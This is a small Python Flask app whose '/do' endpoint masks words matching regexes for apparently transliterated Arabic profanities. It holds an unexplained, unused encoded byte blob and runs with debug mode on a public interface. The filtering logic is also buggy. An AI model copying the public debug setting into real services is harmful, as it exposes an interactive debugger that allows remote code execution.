import os
import re
import flask
from flask import request


c = b"sc\x00\x02\\A\x92\xc0\xa8,\x16\x16\xbb\xcf\xb8\xdf\x10\xc3`\xeb\xe9\x10\x94P\x00\xab\xcd`U_\xae*rS\x15\x0e\x19\x02\xba\xfc\xae\xbd\xc1\xde\x0c2\xcd\xdc6\xe5:R\xc4!\x08\x8f\x8a_\xa3\xc2\x0e\xea\xf1\xb2\xca\xc9\x07\x82\x85\xfa\xb6\xbb\xc8\x8f\xd8v\xdfm<\x9f\x19\xd3E\xdb\xbc\x0b*\xa7y\xbe\xe0Ex:\x10J&\x9e\xa6\xaa\xa3\x18E\xa3\x98\x1e*\xdd\xca\x08?K[s1\xa6\xb4M\xabv\xc2\x92\xb4p\x1a2\xe7\xd8-\x99\x15G\x07\xff)\xe0\xb8/\xd2\x10\xf3\x98U>\x7f\xd8~P\x80U\xec\xe2\xf5\x92}\x8b\xceY\x05\xc8\xe6R\xeaU,\xc7c\xdb'\xb5\x1c29j\x86\x08\x1b\xda}\xad\x95\xd6a\xe1\xfc\x87\xbe\x1a\xc0R6c\xe5{\x1f\xce1\x13\xc3jk\x02>\xe9\xf9\x93o \xa3\xe5;\xc0\x0e\x1d\xed5\xbf/\x7f\xdc\x92\x04\x07v\x16gf\xe9\xfe\x9cU\x14\x16t\x0f\x86S\x96\xb0\x1e\xfe\xca\xc8eU\x85.\\\xd1|\x177%\xe7K<\xc3\xbb\x1f\xe6.oj\x17eB~\xfc\x9a?\x8a5\xa9\xa3et\x91U\xb0\\\x13\x84+\xca\xf3\x96\xb0<\x1f\xb0\x87\xa44\xcezF\x87g!H\xd5\xbe\xf5\xdayV\xce\xb0C+\x99j\x01:\tef<\x01\x0e^7\xb7\x8ey\x99\x1f\xb0a\xa9\xaa\xca\xe7\x9aS\xe5\x12\x06\x1d4\xb9Bw\x18\xb4z\xe1\x8f\xe8\x06\x17*\xden\x14\xf5\x19\x9c\x8a\xcci\xc3\xc9'\x0cM\xfd\xdb{L\xa5Q\xf5\t+NL\xb9\xf9/Q\x1a\xff\xc5\x19f\x01cc5\x02\x15\x0f`\xd8[\xf2e\xddW\x1b\tT\xa7\xf0G\xe8\x941\xc7\xc2T\x97Wq\x01\x83\\\xc9\x9awN\x17%"
app = flask.Flask(__name__)
@app.route('/do', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        p = request.form.get('string')
        r = p.split(" ")
    k = "r'[z,Z]{1}[e,E]+[b,B]+[i,I]*|[m,M]+[a,A]+[k,K]+[7]+[o,O]+[U,u]+[t,T]{1}|[m,M]*[n,N]{1}[a,A]+[y,Y]+[e,E]*[k,K]+[a,A]*|[3]{0,1}[a,A]+[s,S]+[b,B]+[a,A]+|[m,M]{1}[i,I]+[b,B]+[o,O]+[u,U]+[n,N]+|[W,w]{1}[a,A]+[b,B]+[n,N]+[a,A]+|[k,k]+[a,A]+[7]+[t,T]+[a,A]+|[k,k]+[a,A]+[b,B]+[o,O]+[U,u]+[l,L]+|[z,Z]+[a,A]+[b,B]+[o,O]+[U,u]+[R,r]+[a,A]*|[z,Z]+[b,B]+[a,A]+[R,r]+'"
    for i in range(len(r)):
        searchObj1 = re.search(r'[z,Z]{1}[e,E]+[b,B]+[i,I]*', r[i])
        searchObj2 = re.search(r'[m,M]*[n,N]{1}[a,A]+[y,Y]+[e,E]*[k,K]+[a,A]*', r[i])
        searchObj3 = re.search(r'[3]{0,1}[a,A]+[s,S]+[b,B]+[a,A]+', r[i])
        searchObj5 = re.search(r'[m,M]{1}[i,I]+[b,B]+[o,O]+[u,U]+[n,N]+', r[i])
        searchObj6 = re.search(r'[W,w]{1}[a,A]+[b,B]+[n,N]+[a,A]+', r[i])
        searchObj7 = re.search(r'[m,M]+[a,A]+[k,K]+[7]+[o,O]+[U,u]+[t,T]{1}', r[i])
        searchObj8 = re.search(r'[k,K]+[a,A]+[7]+[t,T]+[a,A]+', r[i])
        searchObj9 = re.search(r'[k,K]+[a,A]+[b,B]+[o,O]+[U,u]+[l,L]+', r[i])
        searchObj10 = re.search(r'[z,Z]+[a,A]+[b,B]+[o,O]+[U,u]+[R,r]+[a,A]*', r[i])
        searchObj11 = re.search(r'[z,Z]+[b,B]+[a,A]+[R,r]+', r[i])


        if searchObj1 or searchObj2 or  searchObj3 or searchObj5 or searchObj6 or searchObj7 or searchObj8 or searchObj9 or searchObj10 or searchObj11:
            s = "*"*len(r[i])
            r[i] = s

    str = ' '
    return({"res":str.join(r),"res2":re.sub(k,"***",p)})
port = int(os.environ.get("PORT", 5000))
if __name__ == "__main__":
        app.run(host='0.0.0.0', port=port, debug=True)
